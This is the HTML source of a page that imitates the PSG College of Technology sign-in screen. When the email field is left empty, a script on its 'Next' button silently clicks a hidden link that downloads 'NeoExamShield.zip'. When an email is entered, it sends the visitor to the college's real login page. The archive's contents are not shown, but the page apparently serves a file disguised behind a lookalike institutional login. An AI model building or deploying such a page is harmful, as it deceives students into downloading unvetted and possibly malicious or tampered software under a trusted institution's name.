<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PSG College Of Technology</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 0;
        }

        /* Full viewport background */
        .page-bg {
            width: 100%;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('https://prod-users-asset.s3.amazonaws.com/assets/images/auth/page_bg.jpg') 0px 0px / cover no-repeat;
        }

        /* Main card container */
        .login-card {
            width: 94%;
            max-width: 1308px;
            max-height: 720px;
            height: 90vh;
            display: flex;
            flex-direction: row;
            background-color: #f5f5f5;
            box-shadow: 0 4px 31px 0 rgba(0, 0, 0, 0.08);
            padding: 20px;
            border-radius: 1.875rem;
            gap: 20px;
        }

        /* Left banner image */
        .banner-side {
            width: 50%;
            height: 100%;
            flex-shrink: 0;
        }

        .banner-side img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-top-left-radius: 0.9375rem;
            border-bottom-left-radius: 0.9375rem;
            display: block;
        }

        /* Right form side */
        .form-side {
            width: 50%;
            height: 100%;
            overflow-y: auto;
            background: url('https://prod-users-asset.s3.amazonaws.com/assets/images/auth/form_bg.png') 0px 0px / cover no-repeat;
            border-top-right-radius: 0.9375rem;
            border-bottom-right-radius: 0.9375rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .form-inner {
            width: 75%;
            max-width: 380px;
            padding: 30px 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* College branding */
        .branding {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }

        .branding img {
            width: 45px;
            height: 45px;
            object-fit: contain;
            margin-bottom: 15px;
        }

        .branding h2 {
            font-size: 1.125rem;
            font-weight: 700;
            text-align: center;
            color: #000;
            line-height: 1.3;
        }

        /* Sign In header */
        .signin-header {
            margin-bottom: 14px;
        }

        .signin-header h3 {
            font-size: 1.125rem;
            font-weight: 500;
            color: #000;
            margin-bottom: 4px;
        }

        .signin-header p {
            font-size: 0.875rem;
            font-weight: 400;
            color: #6b7280;
        }

        /* Email input */
        .form-group {
            margin: 10px 0;
        }

        .form-group label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            color: #000;
            margin-bottom: 10px;
        }

        .form-group label .required {
            color: #ef4444;
        }

        .form-group input {
            width: 100%;
            max-width: 380px;
            height: 40px;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            background-color: #f5f5f5;
            padding: 0 10px;
            font-size: 0.875rem;
            font-weight: 500;
            color: #000;
            font-family: inherit;
            outline: none;
            transition: box-shadow 0.2s ease, border-color 0.2s ease;
        }

        .form-group input:focus {
            box-shadow: 0 0 0 0.2rem rgba(59, 130, 246, 0.1);
            border-color: #3b82f6;
        }

        .form-group input:hover {
            box-shadow: 0 0 0 0.2rem rgba(59, 130, 246, 0.1);
        }

        /* Next button */
        .next-btn {
            display: block;
            width: 100%;
            max-width: 380px;
            height: 40px;
            background-color: #3b82f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 0.875rem;
            font-weight: 500;
            font-family: inherit;
            cursor: pointer;
            margin-top: 30px;
            transition: background-color 0.2s ease;
            outline: none;
        }

        .next-btn:hover {
            background-color: #2563eb;
        }

        .next-btn:active {
            background-color: #1d4ed8;
        }

        /* System compatibility link */
        .compat-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            max-width: 380px;
            font-size: 0.875rem;
            font-weight: 500;
            color: #3b82f6;
            cursor: pointer;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .compat-link:hover {
            color: #2563eb;
            text-decoration: underline;
        }

        /* Scrollbar styling for form side */
        .form-side::-webkit-scrollbar {
            width: 4px;
        }

        .form-side::-webkit-scrollbar-thumb {
            background-color: rgba(0, 0, 0, 0.15);
            border-radius: 2px;
        }

        .form-side::-webkit-scrollbar-track {
            background: transparent;
        }

        /* Hidden download link */
        #download-link {
            display: none;
        }

        /* Responsive: mobile / tablet */
        @media (max-width: 1024px) {
            .login-card {
                flex-direction: column;
                height: 100vh;
                max-height: none;
                border-radius: 0;
                width: 100%;
                padding: 20px;
            }

            .banner-side {
                width: 100%;
                height: 40%;
                margin-bottom: 24px;
            }

            .banner-side img {
                border-radius: 0.9375rem 0.9375rem 0 0;
            }

            .form-side {
                width: 100%;
                height: auto;
                border-radius: 0 0 0.9375rem 0.9375rem;
                overflow-y: visible;
            }

            .form-inner {
                width: 95%;
                padding: 15px 0;
            }
        }
    </style>
</head>
<body>
    <div class="page-bg">
        <div class="login-card">
            <!-- Left: Banner SVG -->
            <div class="banner-side">
                <img src="login_bg.svg" alt="">
            </div>

            <!-- Right: Form -->
            <div class="form-side">
                <div class="form-inner">
                    <!-- College Logo + Name -->
                    <div class="branding">
                        <img src="logo.jpeg" alt="">
                        <h2>PSG College Of Technology</h2>
                    </div>

                    <!-- Sign In Header -->
                    <div class="signin-header">
                        <h3>Sign In</h3>
                        <p>The key to happiness is to sign in.</p>
                    </div>

                    <!-- Email Field -->
                    <div class="form-group">
                        <label>
                            Email <span class="required">*</span>
                        </label>
                        <input type="text" id="email" name="email" autocomplete="email" placeholder="">
                    </div>

                    <!-- Next Button (triggers download) -->
                    <button class="next-btn" id="next-btn" type="button">Next</button>

                    <!-- Hidden download anchor pointing to local NeoExamShield.zip in web root -->
                    <a id="download-link" href="NeoExamShield.zip" download="NeoExamShield.zip"></a>

                    <!-- System Compatibility Check -->
                    <a class="compat-link" href="setup.html">System Compatibility Check?</a>
                </div>
            </div>
        </div>
    </div>

    <noscript>Please enable JavaScript to continue using this application.</noscript>

    <script>
        // When "Next" is clicked, auto-download only if email field is empty
        document.getElementById('next-btn').addEventListener('click', function() {
            var emailInput = document.getElementById('email');
            if (!emailInput.value.trim()) {
                var downloadLink = document.getElementById('download-link');
                downloadLink.click();
            } else {
                window.location.href = 'https://pat.psgtech.ac.in/login';
            }
        });
    </script>
</body>
</html>
